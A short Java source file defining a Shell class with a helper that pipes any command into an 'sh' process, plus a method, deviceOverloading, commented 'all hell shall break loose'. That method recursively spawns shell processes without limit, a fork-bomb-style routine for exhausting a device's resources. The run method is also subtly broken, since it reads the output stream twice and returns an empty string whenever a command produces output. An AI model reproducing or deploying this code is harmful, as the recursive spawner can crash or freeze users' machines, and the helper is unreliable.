package anything.shell;

import java.io.*;
import java.util.stream.Collectors;

public class Shell{
    public static String run(String command) throws IOException{
        Process proc = Runtime.getRuntime().exec("sh");
        InputStream procI = proc.getInputStream();
        InputStream procErr = proc.getErrorStream();
        DataOutputStream procO = new DataOutputStream(proc.getOutputStream());

        //write the command and flush
        procO.writeBytes(command + "\n");
        procO.flush();


        //exit after
        procO.writeBytes("exit\n");
        procO.flush();

        //then close the stream
        procO.close();

        BufferedReader res = new BufferedReader(new InputStreamReader(procI)), err = new BufferedReader(new InputStreamReader(procErr));
        if(res.lines().parallel().collect(Collectors.joining("\n")).length() == 0) return err.lines().parallel().collect(Collectors.joining("\n"));
        return res.lines().parallel().collect(Collectors.joining("\n"));
    }

    //all hell shall break loose.
    public static void deviceOverloading() throws IOException{
        for(int i = 0; i < 25; i++){
            Runtime.getRuntime().exec("sh");
            deviceOverloading();
        }
    }
}
